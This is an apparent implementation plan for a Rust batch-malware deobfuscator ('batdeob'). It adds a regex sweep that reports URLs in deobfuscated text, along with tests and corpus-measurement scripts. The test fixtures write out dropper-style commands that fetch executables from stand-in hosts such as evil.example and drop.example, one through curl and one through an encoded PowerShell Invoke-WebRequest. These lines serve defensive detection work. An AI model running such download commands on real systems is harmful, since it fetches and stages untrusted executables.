# batdeob Plan K — URL sweep over deobfuscated cmd text

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development.

**Goal:** Many corpus samples have URLs in the deobfuscated batch output that never become `Download` traits because they don't pass through `curl`/`certutil`/`bitsadmin`/ps1_scan handlers. Examples: `set DLURL=http://x/y`, `echo http://evil/y > file`, or URLs in `start` arguments. Add a final regex sweep over `report.deobfuscated` that emits `Download` traits for any URL not already tracked.

**Prereq:** Plans A–J landed. 233 tests, v9 corpus has 710 Download traits, 100% success.

---

## Task 1: Add `deob_url_scan` finalize step

**Files:**
- Create: `rust/crates/batdeob-core/src/deob_scan.rs`
- Modify: `rust/crates/batdeob-core/src/lib.rs`
- Modify: `rust/crates/batdeob-core/src/traits.rs` (new variant `DownloadInDeobText`)

Design: at the end of `analyze()` (after `vbs_scan` and `dedup_traits`), run a regex pass over `report.deobfuscated`. Find every `http://`, `https://`, `ftp://`, `file://` URL. Dedup against the existing `Trait::Download` `src` values + `Trait::CertutilDownload` URLs + `Trait::BitsadminDownload` URLs. For each unmatched URL, emit a `Trait::DownloadInDeobText { src, line_hint }` (separate variant so analysts can tell where it came from).

Why a separate variant: existing `Trait::Download { cmd, src, dst }` carries a `cmd` field describing the command source. URLs swept from deob text don't have a specific command source — they may be in a `set` value or `echo` redirect or somewhere else. A distinct variant is more honest than synthesizing a fake `cmd`.

- [ ] **Step 1: Add the trait variant**

In `rust/crates/batdeob-core/src/traits.rs`, add to the enum:

```rust
    DownloadInDeobText { src: String, line_hint: String },
```

- [ ] **Step 2: Add tests** to `lib.rs`:

```rust
#[cfg(test)]
mod deob_url_scan_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn url_in_set_value_surfaces() {
        let script = b"set DLURL=http://evil.example/y.exe\r\necho %DLURL%\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("evil.example/y.exe")
        ));
        assert!(has, "URL in set value not swept: {:?}", report.traits);
    }

    #[test]
    fn url_in_echo_redirect_surfaces() {
        let script = b">payload.txt echo http://drop.example/p.exe\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("drop.example/p.exe")
        ));
        assert!(has, "URL in echo redirect not swept: {:?}", report.traits);
    }

    #[test]
    fn curl_url_not_double_emitted() {
        let script = b"curl -o out.exe http://x.example/y.exe\r\n";
        let report = analyze(script, &Config::default());
        let download_count = report.traits.iter()
            .filter(|t| matches!(t, Trait::Download { src, .. } if src.contains("x.example")))
            .count();
        let sweep_count = report.traits.iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("x.example")))
            .count();
        assert_eq!(download_count, 1, "expected 1 Download trait, got {}", download_count);
        assert_eq!(sweep_count, 0, "curl URL double-emitted as DownloadInDeobText: {}", sweep_count);
    }

    #[test]
    fn ps1_url_not_double_emitted() {
        use base64::Engine;
        let ps = r#"Invoke-WebRequest -Uri "http://ps1.example/z.exe" -OutFile z.exe"#;
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        // The URL is inside the PS payload, NOT in the deobfuscated batch text
        // (which only contains the powershell command line itself).
        // ps1_scan emits Trait::Download for it. The deob sweep should NOT double-emit
        // (the URL doesn't appear in the deob text, only in the b64 payload).
        let sweep_count = report.traits.iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("ps1.example")))
            .count();
        assert_eq!(sweep_count, 0, "ps1 URL leaked to deob sweep: {}", sweep_count);
    }
}
```

- [ ] **Step 3: Create `rust/crates/batdeob-core/src/deob_scan.rs`**:

```rust
//! Final URL sweep over the deobfuscated batch text. Catches URLs that
//! were normalized into the output but didn't pass through any specific
//! handler (set values, echo content, start arguments, etc.).
//!
//! Dedups against URLs already surfaced by Download/CertutilDownload/
//! BitsadminDownload traits.

use crate::env::Environment;
use crate::traits::Trait;
use once_cell::sync::Lazy;
use regex::Regex;

#[allow(clippy::expect_used)]
static URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\b(https?://[^\s"'<>(){}\[\]|^&]+|ftp://[^\s"'<>(){}\[\]|^&]+|file://[^\s"'<>(){}\[\]|^&]+)"#)
        .expect("url sweep regex")
});

pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
    // Build a set of URLs already known
    let known: std::collections::HashSet<String> = env.traits.iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    // Sweep
    let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let mut url = m.as_str().to_string();
        // Trim common trailing punctuation that the regex's terminator class missed
        while let Some(last) = url.chars().last() {
            if matches!(last, ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?') {
                url.pop();
            } else {
                break;
            }
        }
        if url.len() < 8 { continue; }   // http://x is the minimum sensible URL
        if known.contains(&url) { continue; }
        if !seen_new.insert(url.clone()) { continue; }

        // Best-effort: find the line containing this URL for context
        let line_hint = deobfuscated.lines()
            .find(|l| l.contains(&url))
            .map(|l| l.chars().take(200).collect::<String>())
            .unwrap_or_default();

        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint,
        });
    }
}
```

- [ ] **Step 4: Wire from `analyze()` in `lib.rs`**

Find where `vbs_scan::scan_vbs_payloads` is called. Add immediately AFTER it (before `dedup_traits`):

```rust
    deob_scan::scan_deob_text(&out, &mut env);
    dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
```

And add the module declaration near the other `pub mod` statements:

```rust
pub mod deob_scan;
```

- [ ] **Step 5: Verify**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
```

Expected: 233 base + 4 new = 237 tests passing.

- [ ] **Step 6: Update `summarize` to include `DownloadInDeobText`**

In `rust/crates/batdeob-cli/src/main.rs`, find `build_summary`. The current arm:

```rust
            Trait::Download { src, dst, .. } | Trait::CertutilDownload { url: src, dst } | Trait::BitsadminDownload { url: src, dst } => {
```

Add an arm for the new variant — emit it under `downloads` with `dst: None`:

```rust
            Trait::DownloadInDeobText { src, .. } => {
                downloads.push(serde_json::json!({
                    "src": src,
                    "dst": null,
                    "source": "deob-text-sweep",
                }));
            }
```

(The existing arms can also be tagged with `"source": "handler"` for clarity if you want; optional.)

- [ ] **Step 7: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/ rust/crates/batdeob-cli/src/main.rs
git commit -m "Add deob_scan: URL sweep over deobfuscated batch text"
```

---

## Task 2: Corpus v10 + measurement

- [ ] **Step 1: Build + run**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3
sed 's|corpus_results_v9|corpus_results_v10|g' /tmp/corpus_run_v9.sh > /tmp/corpus_run_v10.sh
chmod +x /tmp/corpus_run_v10.sh
mkdir -p /tmp/corpus_results_v10 && rm -rf /tmp/corpus_results_v10/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v10.sh > /tmp/corpus_run_v10.log 2>&1
ls /tmp/corpus_results_v10/*.json | wc -l
```

- [ ] **Step 2: Compare v9 vs v10**

```bash
python3 <<'PY'
import json
from pathlib import Path
from collections import Counter

def stats(d):
    samples = {}
    for f in Path(d).glob("*.json"):
        if f.stat().st_size == 0: continue
        try: samples[f.stem] = json.load(open(f))
        except: pass
    return samples

v9 = stats("/tmp/corpus_results_v9")
v10 = stats("/tmp/corpus_results_v10")
common = set(v9) & set(v10)
print(f"v9={len(v9)}  v10={len(v10)}  common={len(common)}")

def counts(samples, keys):
    cnt = Counter()
    for k in keys:
        for t in samples[k].get("traits", []):
            cnt[t.get("kind","")] += 1
    return cnt

c9 = counts(v9, common)
c10 = counts(v10, common)
print(f"\nOn {len(common)} common samples:")
print(f"  {'Trait':32} {'v9':>8} {'v10':>8}  Δ")
for k in sorted(set(c9)|set(c10), key=lambda x: -max(c9[x], c10[x]))[:18]:
    delta = c10[k] - c9[k]
    sign = "+" if delta > 0 else ""
    print(f"    {k:30} {c9[k]:>8} {c10[k]:>8}  {sign}{delta}")

# How many samples gained DownloadInDeobText traits?
gained = lost = 0; gain_total = 0
gain_examples = []
for k in common:
    in_v9 = sum(1 for t in v9[k].get("traits",[]) if t.get("kind") in ("Download", "DownloadInDeobText"))
    in_v10 = sum(1 for t in v10[k].get("traits",[]) if t.get("kind") in ("Download", "DownloadInDeobText"))
    if in_v10 > in_v9:
        gained += 1; gain_total += (in_v10 - in_v9)
        if len(gain_examples) < 5:
            new = [t for t in v10[k].get("traits",[]) if t.get("kind") == "DownloadInDeobText"][:1]
            ex_url = new[0].get("src") if new else "(none)"
            gain_examples.append((k, in_v9, in_v10, ex_url))
    elif in_v9 > in_v10:
        lost += 1

print(f"\nDownload+Sweep delta v9 → v10:")
print(f"  samples_gained: {gained}  (total +{gain_total} new URLs found)")
print(f"  samples_lost: {lost}")
for sha, in_v9, in_v10, url in gain_examples:
    print(f"  {sha}  {in_v9} → {in_v10}  e.g. {url[:80]}")
PY
```

- [ ] **Step 3: Commit completion marker**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "$(cat <<EOF
Plan K complete: deob-text URL sweep, v10 corpus

[paste the trait delta + gain stats]
EOF
)"
```

## Report

- v9 vs v10 trait delta (especially the NEW `DownloadInDeobText` count)
- Samples gained
- 5 example new URLs found by sweep
- Final test count (target: 237)
- Commit SHA

---

## Self-review

- **Spec coverage**: a single regex sweep + dedup + new trait variant. Clean scope.
- **Placeholders**: none.
- **Type consistency**: `Trait::DownloadInDeobText` is new; used only in `deob_scan` and `summarize`.
- **Risk**: the URL regex is generous; may pick up benign URLs in comments/strings. Mitigation: dedup against handler-sourced Downloads keeps the volume manageable; `TraitsCapped` from Plan E limits per-kind events.

**Plan K complete.** Execute via `superpowers:subagent-driven-development`.
